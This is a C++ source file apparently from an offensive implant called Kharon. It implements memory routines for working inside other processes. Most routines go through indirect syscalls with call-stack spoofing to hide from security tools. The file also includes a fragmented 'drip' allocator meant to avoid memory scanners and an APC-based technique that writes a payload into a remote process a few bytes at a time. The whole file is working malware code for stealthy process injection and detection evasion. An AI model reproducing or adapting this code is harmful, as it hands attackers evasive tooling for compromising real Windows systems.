#include <Kharon.h>

auto DECLFN Memory::Read(
    _In_  PVOID   Base,
    _In_  BYTE*   Buffer,
    _In_  SIZE_T  Size,
    _Out_ PSIZE_T Reads,
    _In_  HANDLE  Handle
) -> BOOL {
    const UINT32 Flags = Self->Config.Syscall;
    NTSTATUS    Status = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE ) {
        return NT_SUCCESS( Self->Ntdll.NtReadVirtualMemory(
            Handle, Base, Buffer, Size, (PULONG)Reads
        ));
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Read].Instruction
        : (UPTR)Self->Ntdll.NtReadVirtualMemory;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Read].ssn
        : 0;


    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Base,
        (UPTR)Buffer, (UPTR)Size, (UPTR)Reads
    );

    Self->Usf->NtStatusToError(Status);

    return NT_SUCCESS(Status);
}

auto DECLFN Memory::Alloc(
    _In_  PVOID   Base,
    _In_  SIZE_T  Size,
    _In_  ULONG   AllocType,
    _In_  ULONG   Protect,
    _In_  HANDLE  Handle
) -> PVOID {
    UINT32 Flags = Self->Config.Syscall;

    NTSTATUS Status      = STATUS_UNSUCCESSFUL;
    PVOID    BaseAddress = Base;
    SIZE_T   RegionSize  = Size;

    if ( ! Flags ) {
        KhDbg("execute without syscall and spoof");
        if ( Handle == NtCurrentProcess() ) {
            return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
        } else {
            return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
        }
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Alloc].Instruction
        : (UPTR)Self->Ntdll.NtAllocateVirtualMemory;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Alloc].ssn
        : 0;

    KhDbg("executing indirect syscall with spoof");
    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)&BaseAddress,
        0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
    );
    
    Self->Usf->NtStatusToError( Status );
    
    return NT_SUCCESS( Status ) ? BaseAddress : nullptr;
}

auto DECLFN Memory::DripAlloc(
    _In_  SIZE_T  Size,
    _In_  ULONG   Protect,
    _In_  HANDLE  Handle
) -> PVOID {
    if ( Size < this->PageGran ) 
        return Self->Mm->Alloc( nullptr, Size, MEM_COMMIT, Protect, Handle );

    ULONG GranCount = ( PAGE_ALIGN( Size ) / this->PageGran ) + 1;
    ULONG PageCount = ( this->PageGran / this->PageSize );

    PVOID  BaseAddress = Self->Usf->ValidGranMem( Handle, GranCount );
    PVOID  CurrentBase = BaseAddress;
    PVOID* AddressList = (PVOID*)hAlloc( GranCount );

    KhDbg("valid gran memory: %p\n", BaseAddress);

    for ( INT i = 0; i < GranCount; i++ ) {
        CurrentBase = Self->Mm->Alloc( 
            CurrentBase, PageGran, MEM_RESERVE, PAGE_NOACCESS, Handle
        );

        KhDbg("reserved current[%d] = %p\n", i, CurrentBase);

        AddressList[i] = CurrentBase;
        CurrentBase    = (PVOID)( (UPTR)CurrentBase + PageGran );
    }  

    for ( INT x = 0; x < GranCount; x++ ) {
        for ( INT z = 0; z < PageCount; z++ ) {
            CurrentBase = (PVOID)( (UPTR)( AddressList[x] ) + ( z * PageSize ) );

            CurrentBase = Self->Mm->Alloc( 
                CurrentBase, PageSize, MEM_COMMIT, Protect, Handle 
            );

            KhDbg("commit current[%d] = %p\n", z, CurrentBase);
        }
    }

    KhDbg("base %p\n", BaseAddress);

    return BaseAddress;
}

auto DECLFN Memory::Protect(
    _In_  PVOID   Base,
    _In_  SIZE_T  Size,
    _In_  ULONG   NewProt,
    _Out_ ULONG  *OldProt,
    _In_  HANDLE  Handle
) -> BOOL {
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;


    if ( Flags == SYSCALL_NONE ) {
        if ( Handle == NtCurrentProcess() ) {
            return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
        } else {
            return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
        }
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Protect].Instruction
        : (UPTR)Self->Ntdll.NtProtectVirtualMemory;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Protect].ssn
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)&Base,
        (UPTR)&Size, (UPTR)NewProt, (UPTR)OldProt
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::WriteAPC(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size
) -> BOOL {
    G_KHARON

    HANDLE   ThreadHandle = NULL;
    PVOID    WritePtr     = nullptr;
    NTSTATUS NtStatus     = STATUS_SUCCESS;
    INT32    AlignCheck   = ( Size % 16 );
    INT32    OffsetMax    = ( Size - AlignCheck );
    INT32    OneCounter   = 0;
    INT32    TwoCounter   = 0;
    INT32    ThreeCounter = 0;
    INT32    Mod          = 0;

    ULONG ThreadId = 0;
    PVOID Dummy    = (PVOID)1;

    ThreadHandle = Self->Td->Create(
        Handle, (PVOID)Self->Ntdll.RtlExitUserThread,
        0, CREATE_SUSPENDED, 0, nullptr
    );

    PVOID mRtlInitializeBitMapEx = (PVOID)Self->Krnl32.GetProcAddress( Self->Krnl32.GetModuleHandleA("ntdll.dll"), "RtlInitializeBitMapEx" );
    PVOID mRtlFillMemory         = (PVOID)Self->Krnl32.GetProcAddress( Self->Krnl32.GetModuleHandleA("ntdll.dll"), "RtlFillMemory" );

    if ( Size >= 16 ) {
        for ( OneCounter = 0; OneCounter < OffsetMax - 1; OneCounter = OneCounter + 16 ) {
            WritePtr = ( (PBYTE)Base + OneCounter );

            NtStatus = Self->Td->QueueAPC(
                ThreadHandle,
                mRtlInitializeBitMapEx,
                WritePtr,
                (PVOID)*(UPTR*)( Buffer + OneCounter + 8 ),
                (PVOID)*(UPTR*)( Buffer + OneCounter )
            );
        }
    }

    if ( Size >= 8 ) {
        for ( TwoCounter = OneCounter; (TwoCounter + 8) <= (OneCounter + AlignCheck); TwoCounter += 8 ) {
            WritePtr = ( (PBYTE)Base + TwoCounter );

            NtStatus = Self->Td->QueueAPC(
                ThreadHandle,
                mRtlFillMemory,
                WritePtr,
                (PVOID)8,
                (PVOID)*(UPTR*)(Buffer + TwoCounter)
            );
        }

        AlignCheck -= 8;
    }

    if ( AlignCheck > 0 && AlignCheck < 8 ) {

        if (OneCounter != 0 && TwoCounter != 0)
            ThreeCounter = Mod = TwoCounter;
        else if (OneCounter != 0 && TwoCounter == 0)
            ThreeCounter = Mod = OneCounter;

        for ( ; ThreeCounter < (Mod + AlignCheck); ThreeCounter++ ) {
            WritePtr = ( (PBYTE)Base + ThreeCounter );

            NtStatus = Self->Td->QueueAPC(
                ThreadHandle,
                mRtlFillMemory,
                WritePtr,
                (PVOID)1,
                (PVOID)Buffer[ThreeCounter]
            );
        }
    }

    Self->Krnl32.ResumeThread( ThreadHandle );
    Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
    Self->Ntdll.NtClose( ThreadHandle );
    return TRUE;
}

auto DECLFN Memory::Write(
    _In_  PVOID   Base,
    _In_  BYTE*   Buffer,
    _In_  ULONG   Size,
    _Out_ SIZE_T* Written,
    _In_  HANDLE  Handle
) -> BOOL {
    const UINT32 Flags   = Self->Config.Syscall;
    NTSTATUS     Status  = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE ) {
        return NT_SUCCESS( Self->Ntdll.NtWriteVirtualMemory(
            Handle, Base, Buffer, Size, Written
        ));
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Write].Instruction
        : (UPTR)Self->Ntdll.NtWriteVirtualMemory;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Write].ssn
        : 0;


    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Base,
        (UPTR)Buffer, (UPTR)Size, (UPTR)Written
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::Free(
    _In_ PVOID  Base,
    _In_ SIZE_T Size,
    _In_ ULONG  FreeType,
    _In_ HANDLE Handle
) -> BOOL {
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! Handle ) {
        if ( Flags == SYSCALL_NONE ) {
            return NT_SUCCESS( Self->Ntdll.NtFreeVirtualMemory(
                Handle, &Base, &Size, FreeType
            ));
        }
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Free].Instruction
        : (UPTR)Self->Ntdll.NtFreeVirtualMemory;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Free].ssn
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)&Base, (UPTR)&Size, (UPTR)FreeType
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::MapView(
    _In_        HANDLE          SectionHandle,
    _In_        HANDLE          ProcessHandle,
    _Inout_     PVOID*          BaseAddress,
    _In_        ULONG_PTR       ZeroBits,
    _In_        SIZE_T          CommitSize,
    _Inout_opt_ PLARGE_INTEGER  SectionOffset,
    _Inout_     PSIZE_T         ViewSize,
    _In_        SECTION_INHERIT InheritDisposition,
    _In_        ULONG           AllocationType,
    _In_        ULONG           PageProtection
) -> NTSTATUS {
    const UINT32 Flags = Self->Config.Syscall;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE ) {
        return Self->Ntdll.NtMapViewOfSection(
            SectionHandle, ProcessHandle, BaseAddress, ZeroBits,
            CommitSize, SectionOffset, ViewSize, InheritDisposition,
            AllocationType, PageProtection
        );
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::MapView].Instruction
        : (UPTR)Self->Ntdll.NtMapViewOfSection;

    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::MapView].ssn
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)SectionHandle, (UPTR)ProcessHandle,
        (UPTR)BaseAddress, (UPTR)ZeroBits, (UPTR)CommitSize,
        (UPTR)SectionOffset, (UPTR)ViewSize, (UPTR)InheritDisposition,
        (UPTR)AllocationType, (UPTR)PageProtection
    );

    return Status;
}

auto DECLFN Memory::CreateSection(
    _Out_    PHANDLE           SectionHandle,
    _In_     ACCESS_MASK       DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER    MaximumSize,
    _In_     ULONG             SectionPageProtection,
    _In_     ULONG             AllocationAttributes,
    _In_opt_ HANDLE            FileHandle
) -> NTSTATUS {
    const UINT32 Flags = Self->Config.Syscall;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE ) {
        return Self->Ntdll.NtCreateSection(
            SectionHandle, DesiredAccess, ObjectAttributes,
            MaximumSize, SectionPageProtection, AllocationAttributes,
            FileHandle
        );
    }

    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].Instruction
        : (UPTR)Self->Ntdll.NtCreateSection;

    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].ssn
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)SectionHandle, (UPTR)DesiredAccess,
        (UPTR)ObjectAttributes, (UPTR)MaximumSize,
        (UPTR)SectionPageProtection, (UPTR)AllocationAttributes,
        (UPTR)FileHandle
    );

    return Status;
}